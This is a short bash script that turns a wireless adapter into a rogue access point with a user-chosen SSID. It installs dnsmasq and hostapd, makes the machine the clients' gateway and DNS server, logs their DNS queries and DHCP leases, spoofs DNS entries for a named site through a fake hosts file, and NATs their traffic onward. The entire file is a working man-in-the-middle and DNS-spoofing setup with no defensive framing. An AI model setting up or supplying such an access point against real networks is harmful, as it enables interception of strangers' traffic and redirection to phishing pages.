#! /bin/bash

sudo ifconfig
read -p '[*]Enter network adapter to use: ' netadp
sudo ifconfig $netadp 10.0.0.1/24 up
echo '[*]Adapter IP: 10.0.0.1'
read -p "PRESS ENTER TO CONTINUE" e
sudo apt-get install dnsmasq
sudo apt-get install hostapd
echo [*]Creating dnsmasq.conf file...
echo interface=$netadp > dnsmasq.conf
echo dhcp-range=10.0.0.10,10.0.0.250,12h >> dnsmasq.conf
echo dhcp-option=3,10.0.0.1 >> dnsmasq.conf
echo dhcp-option=6,10.0.0.1 >> dnsmasq.conf
echo server=8.8.8.8 >> dnsmasq.conf
echo log-queries >> dnsmasq.conf
echo log-dhcp >> dnsmasq.conf
echo [*]Creating fakehosts.conf file...
echo 10.0.0.2 fakewebsite.com > fakehosts.conf
echo 10.0.0.2 www.fakewebsite.com >> fakehosts.conf
echo [*]Creating hostapd.conf file...
echo interface=$netadp > hostapd.conf
echo driver=nl80211 >> hostapd.conf
read -p "[*]SSID Name: " ssid
echo ssid=$ssid >> hostapd.conf
echo channel=1 >> hostapd.conf
echo [*]Configuring IPtables
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -P FORWARD ACCEPT
sudo iptables --table nat -A POSTROUTING -o wlan0 -j MASQUERADE
echo "[*]Open 3 windows, 1 for dnsmasq, 2 for hostapd, and 3 if you want to edit fakehosts.conf"
echo "[*]1.)dnsmasq -C dnsmasq.conf -H fakehosts.conf -h -d"
echo "[*]2.)hostapd ./hostapd.conf"
echo "[*]3.)./iptables.sh when done to reverse configurations"
read -p "PRESS ENTER TO CONTINUE" e
